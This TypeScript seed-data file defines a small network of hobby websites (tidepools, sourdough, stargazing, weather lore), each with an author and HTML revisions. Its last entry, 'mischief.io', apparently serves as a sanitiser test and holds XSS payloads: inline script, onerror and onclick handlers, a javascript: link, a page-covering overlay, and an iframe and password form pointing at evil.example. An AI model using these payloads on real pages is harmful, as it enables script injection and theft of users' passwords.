export const PEOPLE = ["Ada Okafor", "Bram Larsen", "Chiara Rossi", "Dmitri Volkov", "Esi Mensah", "Farah Haddad"] as const;
export type PersonName = (typeof PEOPLE)[number];

export interface SeedRevision {
  title: string;
  html: string;
  publishedAt: number;
}

export interface SeedSite {
  address: string;
  author: PersonName;
  revisions: SeedRevision[];
}

const link = (address: string, label: string) => `<a href="${address}">${label}</a>`;

export const SITES: SeedSite[] = [
  {
    address: "tidepool.io",
    author: "Ada Okafor",
    revisions: [
      {
        title: "Tidepool",
        publishedAt: -2880,
        html: `<h1>Tidepool</h1>
<p>A tidepool is a small world that is flooded twice a day and abandoned twice a day. Anemones close up like fists when the water leaves; hermit crabs hurry between stones; limpets sit exactly where they sat yesterday.</p>
<p>Go at low tide, wear shoes you do not love, and step only on bare rock. The best pools sit just below the barnacle line. For what lives beneath the waves, see the ${link("kelpforest.org", "kelp forest notes")}; for why the water leaves at all, ${link("moonphase.io", "the moon")} is responsible.</p>
<p>A complete atlas of every sea star is promised at ${link("seastar-atlas.io", "the sea star atlas")}.</p>`
      },
      {
        title: "Tidepool: a field guide to the pools between the tides",
        publishedAt: 30,
        html: `<h1>Tidepool</h1>
<p>A tidepool is a small world that is flooded twice a day and abandoned twice a day. Anemones close up like fists when the water leaves; hermit crabs hurry between stones; limpets sit exactly where they sat yesterday.</p>
<p>Go at low tide, wear shoes you do not love, and step only on bare rock. The best pools sit just below the barnacle line. Read the ${link("saltmarsh.guide", "salt marsh guide")} for the quieter, muddier cousin of the rock pool, the ${link("kelpforest.org", "kelp forest notes")} for what lives beneath the waves, and ${link("moonphase.io", "the moon")} for why the water leaves at all.</p>
<p>This guide has been rewritten. A complete atlas of every sea star is still promised at ${link("seastar-atlas.io", "the sea star atlas")}.</p>`
      }
    ]
  },
  {
    address: "kelpforest.org",
    author: "Ada Okafor",
    revisions: [
      {
        title: "Kelp Forest Notes",
        publishedAt: -2700,
        html: `<h1>Kelp Forest Notes</h1>
<p>Giant kelp can grow half a metre in a day, anchored by a holdfast that looks like a root but is not one. Sea otters wrap themselves in the fronds to sleep so they do not drift away.</p>
<p>When urchins lose their predators they graze the holdfasts bare and the forest collapses into an urchin barren. The recovery of the kelp is one of the quiet success stories of cold coastlines. Count them yourself with the ${link("kelp-census.org", "kelp census")}.</p>
<p>Shallower cousins are found at the ${link("tidepool.io", "tidepool")}, and the muddy fringe is covered by the ${link("saltmarsh.guide", "salt marsh guide")}.</p>`
      }
    ]
  },
  {
    address: "lanternroom.com",
    author: "Ada Okafor",
    revisions: [
      {
        title: "The Lantern Room: a lighthouse keeper's journal",
        publishedAt: -2500,
        html: `<h1>The Lantern Room</h1>
<p>The keeper's day begins when the light goes out. Polish the brass, trim the wicks, wind the clockwork that turns the great lens. Fog is the enemy; a bell sounds every thirty seconds until it lifts.</p>
<p>Entry from a November night: the storm came in from the west with the spring tide behind it, and the sea reached the second step of the tower. The ${link("weatherlore.net", "weather lore")} predicted it, but nobody listened.</p>
<p>The salt marsh to the south is described in the ${link("saltmarsh.guide", "marsh guide")}, and visitors always ask about the ${link("tidepool.io", "pools below the rocks")}.</p>`
      }
    ]
  },
  {
    address: "saltmarsh.guide",
    author: "Ada Okafor",
    revisions: [
      {
        title: "Salt Marsh Guide",
        publishedAt: -2600,
        html: `<h1>Salt Marsh Guide</h1>
<p>A salt marsh is grass that has learned to live with the sea. Cordgrass pushes salt out through its leaves; samphire stores it. Every high tide lays down a thin layer of silt, and the marsh slowly climbs.</p>
<p>The creeks fill from the bottom, silently, which is why people get stranded. Check the tide table before you go and keep an eye on the creek behind you. Waders feed along the edges; the ${link("birdwatch.club", "bird watch club")} keeps a list of what turns up each season.</p>
<p>See also the rock pools at ${link("tidepool.io", "tidepool")} and the ${link("lanternroom.com", "lantern room")} journal.</p>`
      }
    ]
  },
  {
    address: "sourdough.club",
    author: "Bram Larsen",
    revisions: [
      {
        title: "Sourdough Club",
        publishedAt: -2400,
        html: `<h1>Sourdough Club</h1>
<p>A starter is flour and water that has been left alone with the right company: wild yeast and lactic bacteria. Feed it equal weights of each, every day, and within a week it will double in size before your eyes.</p>
<p>Bread is mostly patience. Mix at night, fold in the morning, shape, and let the dough rest in the cold. A hot pot with a lid gives you steam, and steam gives you a crust that crackles on the way out of the oven.</p>
<p>Keep notes in the ${link("bakerlog.io", "baker's log")}, and if you have leftover whey from cheese, ${link("curdandwhey.net", "curd and whey")} has uses for it. A map of every flour mill lives at ${link("flour-atlas.com", "the flour atlas")}.</p>`
      }
    ]
  },
  {
    address: "bakerlog.io",
    author: "Bram Larsen",
    revisions: [
      {
        title: "Baker's Log",
        publishedAt: -2300,
        html: `<h1>Baker's Log</h1>
<p>Day 1: rye flour, warm water, a jar on top of the fridge. Nothing happens. Day 3: bubbles, and a smell like pear drops. Day 6: it doubles. Day 7: first loaf, dense as a brick, delicious anyway.</p>
<p>Temperature matters more than recipes. A kitchen at 18 degrees makes a bread that tastes of cream; at 26 it tastes sharp. Humidity changes the hydration. Weigh everything and write it down.</p>
<p>Start with the ${link("sourdough.club", "sourdough club")} if you are new here. Cheese makers will like ${link("curdandwhey.net", "this")}, and the weather in the kitchen follows the weather outside, so keep an eye on the ${link("weatherlore.net", "weather lore")}.</p>`
      }
    ]
  },
  {
    address: "curdandwhey.net",
    author: "Bram Larsen",
    revisions: [
      {
        title: "Curd and Whey",
        publishedAt: -2200,
        html: `<h1>Curd and Whey</h1>
<p>Warm milk, add rennet, wait. The milk sets like a custard, and when you cut it the curd falls away from the whey. Everything else in cheese making is deciding how much of the whey to keep.</p>
<p>The liquid is not waste: it makes ricotta, feeds the pigs, and gives a sourdough a tang. Cheese is aged in caves for a reason, and the best caves are described at ${link("cheese-caves.net", "the cheese caves")}.</p>
<p>Bread to eat it with is at the ${link("sourdough.club", "sourdough club")}.</p>`
      }
    ]
  },
  {
    address: "stargazers.space",
    author: "Chiara Rossi",
    revisions: [
      {
        title: "Stargazers",
        publishedAt: -2100,
        html: `<h1>Stargazers</h1>
<p>Give your eyes twenty minutes. The Milky Way appears slowly, first as a smudge and then as a river. Red light keeps your night vision; a phone screen ruins it.</p>
<p>Start with the Moon, which is the easiest target and the most generous: craters along the terminator, seas that are really plains of old lava. A full moon washes out everything else, so the best nights for faint objects are around new moon. The ${link("moonphase.io", "moon phase calendar")} will tell you when.</p>
<p>Old star charts and the mapmakers who drew them are at ${link("cartography.dev", "cartography")}. Cloud is the usual villain, so check the ${link("weatherlore.net", "weather lore")} first.</p>`
      }
    ]
  },
  {
    address: "moonphase.io",
    author: "Chiara Rossi",
    revisions: [
      {
        title: "Moon Phase Calendar",
        publishedAt: -2000,
        html: `<h1>Moon Phase Calendar</h1>
<p>New, waxing crescent, first quarter, waxing gibbous, full, and back again over about twenty-nine and a half days. The Moon is not lit differently; we simply see a different slice of its lit half.</p>
<p>It also moves the sea. Spring tides, the largest, come around the new and full moon when the Sun and Moon pull along the same line. Neap tides, the smallest, come at the quarters. Anyone who walks the shore should know which they are getting, and the ${link("tidepool.io", "tidepool guide")} is written around that.</p>
<p>Observing notes are at ${link("stargazers.space", "stargazers")}, and storms that ride in on a spring tide are collected in the ${link("weatherlore.net", "weather lore")}.</p>`
      }
    ]
  },
  {
    address: "cartography.dev",
    author: "Dmitri Volkov",
    revisions: [
      {
        title: "Cartography",
        publishedAt: -1900,
        html: `<h1>Cartography</h1>
<p>Old maps are arguments. A coastline drawn with confidence means someone sailed it; a coastline drawn with a dotted line means someone was told about it by someone else. Blank space was sometimes filled with sea monsters because there was nothing to put there.</p>
<p>Projection is the original trade-off: you cannot flatten a sphere without lying about area, shape or distance. Mercator keeps angles true, which is why sailors loved it, and why Greenland looks the size of Africa.</p>
<p>Navigators used the stars, see ${link("stargazers.space", "stargazers")}, and harbours were marked from the sea by lights like those in the ${link("lanternroom.com", "lantern room")}. Some islands appear on maps for centuries and then turn out to have never existed; the best list is at ${link("lost-islands.dev", "lost islands")}.</p>`
      }
    ]
  },
  {
    address: "birdwatch.club",
    author: "Esi Mensah",
    revisions: [
      {
        title: "Bird Watch Club",
        publishedAt: -1800,
        html: `<h1>Bird Watch Club</h1>
<p>Sit still and the birds come back. A pair of binoculars, a notebook and a flask will do. Learn the call before the plumage: you will hear ten times as many birds as you ever see.</p>
<p>Autumn on the estuary is the best week of the year. Godwits and curlews feed on the falling tide, and a peregrine usually turns up to scatter them. Check the ${link("saltmarsh.guide", "salt marsh guide")} before going out, and bring a coat; the ${link("weatherlore.net", "weather lore")} says the wind will turn.</p>
<p>Coastal plants and animals worth stopping for are at ${link("kelpforest.org", "the kelp forest notes")}.</p>`
      }
    ]
  },
  {
    address: "weatherlore.net",
    author: "Esi Mensah",
    revisions: [
      {
        title: "Weather Lore",
        publishedAt: -1700,
        html: `<h1>Weather Lore</h1>
<p>Red sky at night, shepherd's delight. Mares' tails and mackerel scales make tall ships take in their sails. Much of the old rhymes holds up: a falling barometer means a storm, and a halo round the Moon means ice crystals high up, which means rain within a day.</p>
<p>At the coast the wind and the tide argue. A strong onshore wind on top of a spring tide, which comes around the full ${link("moonphase.io", "moon")}, floods low roads and fills cellars. The keeper at the ${link("lanternroom.com", "lantern room")} wrote about one such night.</p>
<p>Birds know before the glass does; see the ${link("birdwatch.club", "bird watch club")}. The rock pools at ${link("tidepool.io", "tidepool")} look their best after a storm has turned the stones.</p>`
      }
    ]
  },
  {
    address: "mischief.io",
    author: "Dmitri Volkov",
    revisions: [
      {
        title: "Mischief",
        publishedAt: -1600,
        html: `<h1 onclick="alert('owned')">Mischief</h1>
<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:red">This page tries to cover the whole browser.</p>
<script>document.body.innerHTML = "owned";</script>
<style>body { display: none }</style>
<iframe src="https://evil.example"></iframe>
<img src="x" onerror="alert(1)">
<form action="https://evil.example"><input name="password"></form>
<p>Links: ${link("tidepool.io", "a real address")}, <a href="https://example.com">an outside site</a>, <a href="javascript:alert(1)">a script link</a>, and a <a href="tidepool.io/secret/path">path</a>.</p>
<p>Everything above this line was written by someone hoping to escape the page they published on.</p>`
      }
    ]
  }
];
